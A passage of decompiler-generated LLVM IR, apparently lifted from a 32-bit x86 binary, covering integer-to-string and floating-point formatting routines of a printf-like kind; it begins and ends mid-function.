  %v1_804f897 = icmp eq i1 %v12_804f88d, false
  br i1 %v1_804f897, label %dec_label_pc_804f8a6, label %dec_label_pc_804f899

dec_label_pc_804f899:                             ; preds = %dec_label_pc_804f882
  %v1_804f899 = add i32 %div, 1
  br label %dec_label_pc_804f8a6

dec_label_pc_804f8a6:                             ; preds = %dec_label_pc_804f882, %dec_label_pc_804f899
  %stack_var_-20.0.off0 = phi i32 [ %v1_804f889, %dec_label_pc_804f882 ], [ 0, %dec_label_pc_804f899 ]
  %stack_var_-24.0.in = phi i32 [ %div, %dec_label_pc_804f882 ], [ %v1_804f899, %dec_label_pc_804f899 ]
  %v0_804f8a6 = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_804f8a6, i32* %ebp.global-to-local, align 4
  %v0_804f8a8 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804f8a8, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804f8ae

dec_label_pc_804f8ae:                             ; preds = %dec_label_pc_804f8ed, %dec_label_pc_804f8a6
  %v0_804f8e5 = phi i32 [ %v0_804f8fe, %dec_label_pc_804f8ed ], [ %v0_804f8a6, %dec_label_pc_804f8a6 ]
  %v0_804f8b2 = phi i32 [ %v1_804f900, %dec_label_pc_804f8ed ], [ %v0_804f8a8, %dec_label_pc_804f8a6 ]
  %v1_804f8ae = icmp eq i32 %v0_804f8b2, 0
  br i1 %v1_804f8ae, label %dec_label_pc_804f8e5, label %dec_label_pc_804f8b2

dec_label_pc_804f8b2:                             ; preds = %dec_label_pc_804f8ae
  %v0_804f8b6 = load i32, i32* %esi.global-to-local, align 4
  %div8 = udiv i32 %v0_804f8b2, %v0_804f8b6
  %tmp37 = urem i32 %v0_804f8b2, %v0_804f8b6
  store i32 %div8, i32* %ebx.global-to-local, align 4
  %div9 = udiv i32 %v0_804f8e5, %v0_804f8b6
  %tmp38 = urem i32 %v0_804f8e5, %v0_804f8b6
  store i32 %div9, i32* %ebp.global-to-local, align 4
  %v6_804f8c9 = mul i32 %tmp37, %stack_var_-20.0.off0
  %v2_804f8cd = add i32 %tmp38, %v6_804f8c9
  %v8_804f8d3 = mul i32 %tmp37, %stack_var_-24.0.in
  %v2_804f8d8 = add i32 %div9, %v8_804f8d3
  store i32 %v2_804f8d8, i32* %ecx.global-to-local, align 4
  %div10 = udiv i32 %v2_804f8cd, %v0_804f8b6
  %tmp39 = urem i32 %v2_804f8cd, %v0_804f8b6
  %v2_804f8e0 = add i32 %div10, %v2_804f8d8
  br label %dec_label_pc_804f8ed

dec_label_pc_804f8e5:                             ; preds = %dec_label_pc_804f8ae
  %v0_804f8e9 = load i32, i32* %esi.global-to-local, align 4
  %div13 = udiv i32 %v0_804f8e5, %v0_804f8e9
  %tmp40 = urem i32 %v0_804f8e5, %v0_804f8e9
  br label %dec_label_pc_804f8ed

dec_label_pc_804f8ed:                             ; preds = %dec_label_pc_804f8b2, %dec_label_pc_804f8e5
  %v0_804f8f3 = phi i32 [ %tmp39, %dec_label_pc_804f8b2 ], [ %tmp40, %dec_label_pc_804f8e5 ]
  %storemerge = phi i32 [ %v2_804f8e0, %dec_label_pc_804f8b2 ], [ %div13, %dec_label_pc_804f8e5 ]
  store i32 %storemerge, i32* %ebp.global-to-local, align 4
  %v0_804f8ed = load i32, i32* %edi.global-to-local, align 4
  %v1_804f8ed = add i32 %v0_804f8ed, -1
  store i32 %v1_804f8ed, i32* %edi.global-to-local, align 4
  %tmp41 = icmp ult i32 %v0_804f8f3, 10
  %storemerge15.in.v = select i1 %tmp41, i32 48, i32 %arg5
  %storemerge15.in = add i32 %storemerge15.in.v, %v0_804f8f3
  %v8_804f8f3 = trunc i32 %storemerge15.in to i8
  %v3_804f8fc = inttoptr i32 %v1_804f8ed to i8*
  store i8 %v8_804f8f3, i8* %v3_804f8fc, align 1
  %v0_804f8fe = load i32, i32* %ebp.global-to-local, align 4
  %v1_804f900 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804f900 = or i32 %v1_804f900, %v0_804f8fe
  %v3_804f900 = icmp eq i32 %v2_804f900, 0
  %v1_804f902 = icmp eq i1 %v3_804f900, false
  br i1 %v1_804f902, label %dec_label_pc_804f8ae, label %dec_label_pc_804f904

dec_label_pc_804f904:                             ; preds = %dec_label_pc_804f8ed
  %v4_804f904 = icmp eq i32 %stack_var_-28.0, 0
  br i1 %v4_804f904, label %dec_label_pc_804f90f, label %dec_label_pc_804f90b

dec_label_pc_804f90b:                             ; preds = %dec_label_pc_804f904
  %v0_804f90b = load i32, i32* %edi.global-to-local, align 4
  %v1_804f90b = add i32 %v0_804f90b, -1
  store i32 %v1_804f90b, i32* %edi.global-to-local, align 4
  %v1_804f90c = inttoptr i32 %v1_804f90b to i8*
  store i8 45, i8* %v1_804f90c, align 1
  br label %dec_label_pc_804f90f

dec_label_pc_804f90f:                             ; preds = %dec_label_pc_804f904, %dec_label_pc_804f90b
  %v0_804f912 = load i32, i32* %edi.global-to-local, align 4
  ret i32 %v0_804f912

; uselistorder directives
  uselistorder i32 %v2_804f8cd, { 1, 0 }
  uselistorder i32 %v0_804f8b6, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32 %v0_804f8b2, { 1, 0, 2 }
  uselistorder i32 %v0_804f8e5, { 1, 0, 3, 2 }
  uselistorder i32 %v0_804f887, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32* %edi.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %ecx.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 3, 1, 4 }
  uselistorder i8 45, { 2, 0, 1 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f90f, { 1, 0 }
  uselistorder label %dec_label_pc_804f8ed, { 1, 0 }
  uselistorder label %dec_label_pc_804f8a6, { 1, 0 }
  uselistorder label %dec_label_pc_804f882, { 2, 1, 0 }
}

define i32 @function_804f91c() local_unnamed_addr {
dec_label_pc_804f91c:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %fpu_stat_TOP.global-to-local = alloca i3, align 1
  %st0.global-to-local = alloca x86_fp80, align 4
  %st1.global-to-local = alloca x86_fp80, align 4
  store i3 0, i3* %fpu_stat_TOP.global-to-local, align 1
  %tmp102 = call i16 @__decompiler_undefined_function_3()
  %tmp111 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-22 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-49 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-70 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804f91d = load i32, i32* @edi, align 4
  %v0_804f91e = load i32, i32* @esi, align 4
  %v0_804f91f = load i32, i32* @ebx, align 4
  store i32 %v0_804f91f, i32* %stack_var_-16, align 4
  store i32 %tmp111, i32* %eax.global-to-local, align 4
  store i32 %tmp111, i32* %edx.global-to-local, align 4
  %v4_804f934 = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v5_804f934 = add i3 %v4_804f934, -1
  store i3 %v5_804f934, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_804f93b = add i32 %tmp111, 4
  %v2_804f93b = inttoptr i32 %v1_804f93b to i32*
  %v3_804f93b = load i32, i32* %v2_804f93b, align 4
  store i32 %v3_804f93b, i32* %eax.global-to-local, align 4
  %v1_804f942 = add i32 %tmp111, 8
  %v2_804f942 = inttoptr i32 %v1_804f942 to i8*
  %v3_804f942 = load i8, i8* %v2_804f942, align 1
  %v4_804f942 = zext i8 %v3_804f942 to i32
  %v5_804f942 = load i32, i32* @ecx, align 4
  %v6_804f942 = and i32 %v5_804f942, -256
  %v7_804f942 = or i32 %v6_804f942, %v4_804f942
  store i32 %v7_804f942, i32* %ecx.global-to-local, align 4
  %v1_804f945 = inttoptr i32 %tmp111 to i32*
  %v2_804f945 = load i32, i32* %v1_804f945, align 4
  store i32 %v2_804f945, i32* %ebp.global-to-local, align 4
  %v3_804f947 = and i32 %v3_804f93b, -256
  %v4_804f947 = or i32 %v3_804f947, %v4_804f942
  %v1_804f94d = or i32 %v4_804f947, 32
  %v3_804f94d = trunc i32 %v1_804f94d to i8
  store i32 %v1_804f94d, i32* %eax.global-to-local, align 4
  %v10_804f958 = icmp eq i8 %v3_804f94d, 97
  %v1_804f95a = icmp eq i1 %v10_804f958, false
  br i1 %v1_804f95a, label %dec_label_pc_804f963, label %dec_label_pc_804f95c

dec_label_pc_804f95c:                             ; preds = %dec_label_pc_804f91c
  %v1_804f95c = add i32 %v7_804f942, 6
  %v11_804f95c = trunc i32 %v1_804f95c to i8
  store i32 %v1_804f95c, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804f963

dec_label_pc_804f963:                             ; preds = %dec_label_pc_804f91c, %dec_label_pc_804f95c
  %stack_var_-206.0 = phi i8 [ %v3_804f942, %dec_label_pc_804f91c ], [ %v11_804f95c, %dec_label_pc_804f95c ]
  %v2_804f963 = icmp slt i32 %v2_804f945, 0
  %v1_804f965 = icmp eq i1 %v2_804f963, false
  br i1 %v1_804f965, label %dec_label_pc_804f96c, label %dec_label_pc_804f967

dec_label_pc_804f967:                             ; preds = %dec_label_pc_804f963
  store i32 6, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804f96c

dec_label_pc_804f96c:                             ; preds = %dec_label_pc_804f963, %dec_label_pc_804f967
  store i32 %tmp111, i32* %edx.global-to-local, align 4
  %v1_804f97b = add i32 %tmp111, 12
  %v2_804f97b = inttoptr i32 %v1_804f97b to i32*
  %v3_804f97b = load i32, i32* %v2_804f97b, align 4
  store i32 %v3_804f97b, i32* %eax.global-to-local, align 4
  %v2_804f97e = and i32 %v3_804f97b, 2
  %v3_804f97e = icmp eq i32 %v2_804f97e, 0
  br i1 %v3_804f97e, label %dec_label_pc_804f98c, label %dec_label_pc_804f998

dec_label_pc_804f98c:                             ; preds = %dec_label_pc_804f96c
  %v2_804f98c = urem i32 %v3_804f97b, 2
  %tmp142 = trunc i32 %v2_804f98c to i8
  %tmp = sub nsw i8 0, %tmp142
  %tmp143 = and i8 %tmp, 32
  br label %dec_label_pc_804f998

dec_label_pc_804f998:                             ; preds = %dec_label_pc_804f98c, %dec_label_pc_804f96c
  %stack_var_-26.0 = phi i8 [ 32, %dec_label_pc_804f96c ], [ %tmp143, %dec_label_pc_804f98c ]
  %v1_804f9ac = udiv i32 %v3_804f97b, 256
  %tmp145 = and i32 %v1_804f9ac, 68
  %tmp146 = icmp eq i32 %tmp145, 64
  br i1 %tmp146, label %dec_label_pc_804fafe, label %dec_label_pc_804fa1e

dec_label_pc_804fa1e:                             ; preds = %dec_label_pc_804f998
  store i3 %v4_804f934, i3* %fpu_stat_TOP.global-to-local, align 1
  store i32 %tmp111, i32* %edx.global-to-local, align 4
  %v1_804fa25 = add i32 %tmp111, 16
  %v2_804fa25 = inttoptr i32 %v1_804fa25 to i32*
  store i32 32, i32* %v2_804fa25, align 4
  store i32 3, i32* %stack_var_-152, align 4
  %v4_804fa3c = add i8 %stack_var_-206.0, -96
  %v6_804fa3c = sub i8 95, %stack_var_-206.0
  %v7_804fa3c = and i8 %v6_804fa3c, %stack_var_-206.0
  %v8_804fa3c = icmp slt i8 %v7_804fa3c, 0
  %v9_804fa3c = icmp eq i8 %v4_804fa3c, 0
  %v10_804fa3c = icmp slt i8 %v4_804fa3c, 0
  %v3_804fa41 = icmp eq i1 %v10_804fa3c, %v8_804fa3c
  %v4_804fa41 = icmp eq i1 %v9_804fa3c, false
  %v5_804fa41 = and i1 %v4_804fa41, %v3_804fa41
  br i1 %v5_804fa41, label %dec_label_pc_804fa48, label %dec_label_pc_804fa43

dec_label_pc_804fa43:                             ; preds = %dec_label_pc_804fa1e
  br label %dec_label_pc_804fa48

dec_label_pc_804fa48:                             ; preds = %dec_label_pc_804fa1e, %dec_label_pc_804fa43
  %v2_804fa50 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_804fa50, i32* @ecx, align 4
  br label %dec_label_pc_804fe23

dec_label_pc_804fafe:                             ; preds = %dec_label_pc_804f998
  %v1_804f9bd = add i3 %v4_804f934, -2
  store x86_fp80 0xK3FFF8000000000000000, x86_fp80* %st0.global-to-local, align 4
  %v6_804fb02 = and i32 %v3_804f97b, -65536
  %v2_804fb07 = ptrtoint i32* %stack_var_-70 to i32
  store i32 %v2_804fb07, i32* %edx.global-to-local, align 4
  %v1_804fb0e = udiv i16 %tmp102, 256
  %v2_804fb0e = zext i16 %v1_804fb0e to i32
  %v3_804fb0e = mul nuw nsw i32 %v2_804fb0e, 256
  %tmp147 = urem i16 %tmp102, 256
  %v4_804fb02.masked = zext i16 %tmp147 to i32
  %v11_804fb0e = or i32 %v4_804fb02.masked, %v3_804fb0e
  %v10_804fb0e = or i32 %v11_804fb0e, %v6_804fb02
  %v12_804fb0e = or i32 %v10_804fb0e, 3072
  store i32 %v12_804fb0e, i32* %eax.global-to-local, align 4
  store i32 0, i32* @edi, align 4
  store x86_fp80 0xK401CEE6B280000000000, x86_fp80* %st1.global-to-local, align 4
  store i3 %v1_804f9bd, i3* %fpu_stat_TOP.global-to-local, align 1
  br label %dec_label_pc_804fb22

dec_label_pc_804fb22:                             ; preds = %dec_label_pc_804fb73.dec_label_pc_804fb22_crit_edge, %dec_label_pc_804fafe
  %v2_804fb3f = phi x86_fp80 [ 0xK3FFF8000000000000000, %dec_label_pc_804fafe ], [ %v2_804fb3f.pre, %dec_label_pc_804fb73.dec_label_pc_804fb22_crit_edge ]
  %v1_804fb22 = phi i3 [ %v1_804f9bd, %dec_label_pc_804fafe ], [ %v1_804fb22.pre, %dec_label_pc_804fb73.dec_label_pc_804fb22_crit_edge ]
  %v3_804fb49 = phi x86_fp80 [ 0xK401CEE6B280000000000, %dec_label_pc_804fafe ], [ %v0_804fb22.pre, %dec_label_pc_804fb73.dec_label_pc_804fb22_crit_edge ]
  %stack_var_-212.0 = phi i32 [ %v2_804fb07, %dec_label_pc_804fafe ], [ %v4_804fb44, %dec_label_pc_804fb73.dec_label_pc_804fb22_crit_edge ]
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %tmp148 = fptosi x86_fp80 %v3_804fb49 to i32
  store i32 %tmp148, i32* %eax.global-to-local, align 4
  store i32 %tmp148, i32* %ebx.global-to-local, align 4
  %v5_804fb3c = sitofp i32 %tmp148 to x86_fp80
  %v4_804fb3f = fsub x86_fp80 %v2_804fb3f, %v5_804fb3c
  store i3 %v1_804fb22, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_804fb44 = add i32 %stack_var_-212.0, 9
  %v4_804fb49 = fmul x86_fp80 %v3_804fb49, %v4_804fb3f
  store x86_fp80 %v4_804fb49, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_804fb4b

dec_label_pc_804fb4b:                             ; preds = %dec_label_pc_804fb4b.dec_label_pc_804fb4b_crit_edge, %dec_label_pc_804fb22
  %v0_804fb5d = phi i32 [ %v0_804fb5d.pre, %dec_label_pc_804fb4b.dec_label_pc_804fb4b_crit_edge ], [ %tmp148, %dec_label_pc_804fb22 ]
  %v0_804fb4b = phi i32 [ %v0_804fb4b.pre, %dec_label_pc_804fb4b.dec_label_pc_804fb4b_crit_edge ], [ 0, %dec_label_pc_804fb22 ]
  %v1_804fb4b = add i32 %v0_804fb4b, 1
  store i32 %v1_804fb4b, i32* %esi.global-to-local, align 4
  %v2_804fb50 = sub i32 %v4_804fb44, %v1_804fb4b
  store i32 10, i32* %ecx.global-to-local, align 4
  %div = udiv i32 %v0_804fb5d, 10
  %tmp135 = urem i32 %v0_804fb5d, 10
  store i32 %div, i32* %ebx.global-to-local, align 4
  store i32 %v2_804fb50, i32* %eax.global-to-local, align 4
  %v1_804fb69 = or i32 %tmp135, 48
  %v8_804fb69 = trunc i32 %v1_804fb69 to i8
  store i32 %v1_804fb69, i32* %edx.global-to-local, align 4
  %v3_804fb6f = inttoptr i32 %v2_804fb50 to i8*
  store i8 %v8_804fb69, i8* %v3_804fb6f, align 1
  %v7_804fb71 = icmp sgt i32 %v1_804fb4b, 8
  br i1 %v7_804fb71, label %dec_label_pc_804fb73, label %dec_label_pc_804fb4b.dec_label_pc_804fb4b_crit_edge

dec_label_pc_804fb4b.dec_label_pc_804fb4b_crit_edge: ; preds = %dec_label_pc_804fb4b
  %v0_804fb4b.pre = load i32, i32* %esi.global-to-local, align 4
  %v0_804fb5d.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fb4b

dec_label_pc_804fb73:                             ; preds = %dec_label_pc_804fb4b
  %v0_804fb73 = load i32, i32* @edi, align 4
  %v1_804fb73 = add i32 %v0_804fb73, 1
  store i32 %v1_804fb73, i32* @edi, align 4
  %v7_804fb77 = icmp sgt i32 %v1_804fb73, 2
  br i1 %v7_804fb77, label %dec_label_pc_804fb79, label %dec_label_pc_804fb73.dec_label_pc_804fb22_crit_edge

dec_label_pc_804fb73.dec_label_pc_804fb22_crit_edge: ; preds = %dec_label_pc_804fb73
  %v0_804fb22.pre = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  %v1_804fb22.pre = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v2_804fb3f.pre = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_804fb22

dec_label_pc_804fb79:                             ; preds = %dec_label_pc_804fb73
  %v0_804fb79 = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_804fb79 = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  store x86_fp80 %v1_804fb79, x86_fp80* %st0.global-to-local, align 4
  %v2_804fb7b = add i3 %v0_804fb79, 2
  store i3 %v2_804fb7b, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_804fb7d = add i8 %stack_var_-206.0, -96
  %v6_804fb7d = sub i8 95, %stack_var_-206.0
  %v7_804fb7d = and i8 %v6_804fb7d, %stack_var_-206.0
  %v8_804fb7d = icmp slt i8 %v7_804fb7d, 0
  %v9_804fb7d = icmp eq i8 %v4_804fb7d, 0
  %v10_804fb7d = icmp slt i8 %v4_804fb7d, 0
  %v3_804fb82 = icmp eq i1 %v10_804fb7d, %v8_804fb7d
  %v4_804fb82 = icmp eq i1 %v9_804fb7d, false
  %v5_804fb82 = and i1 %v4_804fb82, %v3_804fb82
  br i1 %v5_804fb82, label %dec_label_pc_804fb91, label %dec_label_pc_804fb84

dec_label_pc_804fb84:                             ; preds = %dec_label_pc_804fb79
  %v4_804fb84 = add i8 %stack_var_-206.0, 32
  br label %dec_label_pc_804fb91

dec_label_pc_804fb91:                             ; preds = %dec_label_pc_804fb79, %dec_label_pc_804fb84
  %stack_var_-206.1 = phi i8 [ %stack_var_-206.0, %dec_label_pc_804fb79 ], [ %v4_804fb84, %dec_label_pc_804fb84 ]
  %stack_var_-42.0 = phi i32 [ 101, %dec_label_pc_804fb79 ], [ 69, %dec_label_pc_804fb84 ]
  %v12_804fb91 = icmp eq i8 %stack_var_-206.1, 103
  %v1_804fb96 = icmp eq i1 %v12_804fb91, false
  br i1 %v1_804fb96, label %dec_label_pc_804fb9f, label %dec_label_pc_804fb98

dec_label_pc_804fb98:                             ; preds = %dec_label_pc_804fb91
  %v0_804fb98 = load i32, i32* %ebp.global-to-local, align 4
  %tmp136 = icmp slt i32 %v0_804fb98, 1
  br i1 %tmp136, label %dec_label_pc_804fba6, label %dec_label_pc_804fb9c

dec_label_pc_804fb9c:                             ; preds = %dec_label_pc_804fb98
  %v1_804fb9c = add i32 %v0_804fb98, -1
  store i32 %v1_804fb9c, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804fba6

dec_label_pc_804fb9f:                             ; preds = %dec_label_pc_804fb91
  %v12_804fb9f = icmp eq i8 %stack_var_-206.1, 102
  br i1 %v12_804fb9f, label %dec_label_pc_804fbaa, label %dec_label_pc_804fb9f.dec_label_pc_804fba6_crit_edge

dec_label_pc_804fb9f.dec_label_pc_804fba6_crit_edge: ; preds = %dec_label_pc_804fb9f
  %v0_804fba6.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804fba6

dec_label_pc_804fba6:                             ; preds = %dec_label_pc_804fb9f.dec_label_pc_804fba6_crit_edge, %dec_label_pc_804fb98, %dec_label_pc_804fb9c
  %v0_804fba6 = phi i32 [ %v0_804fba6.pre, %dec_label_pc_804fb9f.dec_label_pc_804fba6_crit_edge ], [ %v0_804fb98, %dec_label_pc_804fb98 ], [ %v1_804fb9c, %dec_label_pc_804fb9c ]
  store i32 %v0_804fba6, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fbd7

dec_label_pc_804fbaa:                             ; preds = %dec_label_pc_804fb9f
  store i32 -1, i32* %edx.global-to-local, align 4
  %v0_804fbae = load i32, i32* %ebp.global-to-local, align 4
  %v2_804fbae = add i32 %v0_804fbae, -1
  store i32 %v2_804fbae, i32* %ebx.global-to-local, align 4
  %v5_804fbb5 = icmp slt i32 %v2_804fbae, -1
  br i1 %v5_804fbb5, label %dec_label_pc_804fbb7, label %dec_label_pc_804fbd7

dec_label_pc_804fbb7:                             ; preds = %dec_label_pc_804fbaa
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_804fbbf = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_804fbbf, i32* %eax.global-to-local, align 4
  %v4_804fbc7 = bitcast i32* %stack_var_-72 to i8*
  %v5_804fbc7 = call i32 @function_804ce60(i8* %v4_804fbc7, i32 48, i32 21)
  store i32 %v5_804fbc7, i32* %eax.global-to-local, align 4
  %v0_804fbe7.pr.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fbd7

dec_label_pc_804fbd7:                             ; preds = %dec_label_pc_804fbaa, %dec_label_pc_804fbb7, %dec_label_pc_804fba6
  %v1_804fbf7 = phi i32 [ %v0_804fba6, %dec_label_pc_804fba6 ], [ %v0_804fbe7.pr.pre, %dec_label_pc_804fbb7 ], [ %v2_804fbae, %dec_label_pc_804fbaa ]
  store i32 0, i32* %stack_var_-72, align 4
  store i32 48, i32* %stack_var_-71, align 4
  %v7_804fbea = icmp sgt i32 %v1_804fbf7, 20
  br i1 %v7_804fbea, label %dec_label_pc_804fbec, label %dec_label_pc_804fbf7

dec_label_pc_804fbec:                             ; preds = %dec_label_pc_804fbd7
  %v2_804fbec = ptrtoint i32* %stack_var_-49 to i32
  store i32 %v2_804fbec, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804fc0b.preheader

dec_label_pc_804fbf7:                             ; preds = %dec_label_pc_804fbd7
  %v0_804fbf7 = load i32, i32* @esp, align 4
  %v2_804fbf7 = add i32 %v1_804fbf7, 165
  %v3_804fbf7 = add i32 %v2_804fbf7, %v0_804fbf7
  store i32 %v3_804fbf7, i32* %eax.global-to-local, align 4
  %v1_804fbfe = add i32 %v3_804fbf7, 2
  store i32 %v1_804fbfe, i32* %ecx.global-to-local, align 4
  %v2_804fc01 = inttoptr i32 %v1_804fbfe to i8*
  %v3_804fc01 = load i8, i8* %v2_804fc01, align 1
  %v4_804fc01 = add i8 %v3_804fc01, -53
  %v9_804fc01 = sub i8 52, %v3_804fc01
  %v10_804fc01 = and i8 %v9_804fc01, %v3_804fc01
  %v11_804fc01 = icmp slt i8 %v10_804fc01, 0
  %v13_804fc01 = icmp slt i8 %v4_804fc01, 0
  %v2_804fc05 = icmp eq i1 %v13_804fc01, %v11_804fc01
  %v3_804fc05 = zext i1 %v2_804fc05 to i32
  br label %dec_label_pc_804fc0b.preheader

dec_label_pc_804fc0b.preheader:                   ; preds = %dec_label_pc_804fbf7, %dec_label_pc_804fbec
  %v0_804fc0b62 = phi i32 [ %v1_804fbfe, %dec_label_pc_804fbf7 ], [ %v2_804fbec, %dec_label_pc_804fbec ]
  %storemerge51 = phi i32 [ %v3_804fc05, %dec_label_pc_804fbf7 ], [ 0, %dec_label_pc_804fbec ]
  store i32 %storemerge51, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804fc0b

dec_label_pc_804fc0b:                             ; preds = %dec_label_pc_804fc0b.backedge, %dec_label_pc_804fc0b.preheader
  %v3_804fc0c = phi i32 [ %v3_804fc0c.pre, %dec_label_pc_804fc0b.backedge ], [ %storemerge51, %dec_label_pc_804fc0b.preheader ]
  %v0_804fc0b = phi i32 [ %v0_804fc0e, %dec_label_pc_804fc0b.backedge ], [ %v0_804fc0b62, %dec_label_pc_804fc0b.preheader ]
  %v1_804fc0b = add i32 %v0_804fc0b, -1
  store i32 %v1_804fc0b, i32* %ecx.global-to-local, align 4
  %v1_804fc0c = inttoptr i32 %v1_804fc0b to i8*
  %v2_804fc0c = load i8, i8* %v1_804fc0c, align 1
  %v4_804fc0c = trunc i32 %v3_804fc0c to i8
  %v5_804fc0c = add i8 %v2_804fc0c, %v4_804fc0c
  store i8 %v5_804fc0c, i8* %v1_804fc0c, align 1
  %v0_804fc0e = load i32, i32* %ecx.global-to-local, align 4
  %v1_804fc0e = inttoptr i32 %v0_804fc0e to i8*
  %v2_804fc0e = load i8, i8* %v1_804fc0e, align 1
  %v3_804fc0e = zext i8 %v2_804fc0e to i32
  %v4_804fc0e = load i32, i32* %edx.global-to-local, align 4
  %v5_804fc0e = and i32 %v4_804fc0e, -256
  %v6_804fc0e = or i32 %v5_804fc0e, %v3_804fc0e
  store i32 %v6_804fc0e, i32* %edx.global-to-local, align 4
  %v7_804fc10 = icmp eq i8 %v2_804fc0e, 48
  br i1 %v7_804fc10, label %dec_label_pc_804fc0b.backedge, label %dec_label_pc_804fc15

dec_label_pc_804fc0b.backedge:                    ; preds = %dec_label_pc_804fc0b, %dec_label_pc_804fc15
  %v3_804fc0c.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804fc0b

dec_label_pc_804fc15:                             ; preds = %dec_label_pc_804fc0b
  %v2_804fc15 = add i8 %v2_804fc0e, -57
  %v7_804fc15 = sub i8 56, %v2_804fc0e
  %v8_804fc15 = and i8 %v7_804fc15, %v2_804fc0e
  %v9_804fc15 = icmp slt i8 %v8_804fc15, 0
  %v10_804fc15 = icmp eq i8 %v2_804fc15, 0
  %v11_804fc15 = icmp slt i8 %v2_804fc15, 0
  %v3_804fc18 = icmp eq i1 %v11_804fc15, %v9_804fc15
  %v4_804fc18 = icmp eq i1 %v10_804fc15, false
  %v5_804fc18 = and i1 %v4_804fc18, %v3_804fc18
  br i1 %v5_804fc18, label %dec_label_pc_804fc0b.backedge, label %dec_label_pc_804fc1a

dec_label_pc_804fc1a:                             ; preds = %dec_label_pc_804fc15
  %v2_804fc1a = ptrtoint i32* %stack_var_-71 to i32
  store i32 %v2_804fc1a, i32* %eax.global-to-local, align 4
  %tmp144 = icmp ugt i32 %v0_804fc0e, %v2_804fc1a
  store i32 -1, i32* %esi.global-to-local, align 4
  br i1 %tmp144, label %dec_label_pc_804fc25, label %dec_label_pc_804fc32

dec_label_pc_804fc25:                             ; preds = %dec_label_pc_804fc1a
  store i32 %v2_804fb07, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804fc3b

dec_label_pc_804fc32:                             ; preds = %dec_label_pc_804fc1a
  store i32 %v2_804fc1a, i32* %edx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  store i32 %v2_804fc1a, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804fc3b

dec_label_pc_804fc3b:                             ; preds = %dec_label_pc_804fc25, %dec_label_pc_804fc32
  %v0_804fc3b = phi i32 [ %v0_804fc0e, %dec_label_pc_804fc25 ], [ %v2_804fc1a, %dec_label_pc_804fc32 ]
  %v1_804fc3b = add i32 %v0_804fc3b, 1
  store i32 %v1_804fc3b, i32* %eax.global-to-local, align 4
  %v2_804fc42 = inttoptr i32 %v1_804fc3b to i8*
  store i8 0, i8* %v2_804fc42, align 1
  br i1 %v1_804fb96, label %dec_label_pc_804fc68, label %dec_label_pc_804fc4d

dec_label_pc_804fc4d:                             ; preds = %dec_label_pc_804fc3b
  %v0_804fc4d = load i32, i32* %esi.global-to-local, align 4
  %v5_804fc50 = icmp slt i32 %v0_804fc4d, -4
  br i1 %v5_804fc50, label %dec_label_pc_804fc75, label %dec_label_pc_804fc52

dec_label_pc_804fc52:                             ; preds = %dec_label_pc_804fc4d
  %v1_804fc52 = load i32, i32* %ebx.global-to-local, align 4
  %v7_804fc54 = icmp slt i32 %v1_804fc52, %v0_804fc4d
  br i1 %v7_804fc54, label %dec_label_pc_804fc75, label %dec_label_pc_804fc5d

dec_label_pc_804fc5d:                             ; preds = %dec_label_pc_804fc52
  %v2_804fc64 = sub i32 %v1_804fc52, %v0_804fc4d
  store i32 %v2_804fc64, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804fc79

dec_label_pc_804fc68:                             ; preds = %dec_label_pc_804fc3b
  %v4_804fc68 = zext i8 %stack_var_-206.1 to i32
  %v5_804fc68 = load i32, i32* %ecx.global-to-local, align 4
  %v6_804fc68 = and i32 %v5_804fc68, -256
  %v7_804fc68 = or i32 %v6_804fc68, %v4_804fc68
  store i32 %v7_804fc68, i32* %ecx.global-to-local, align 4
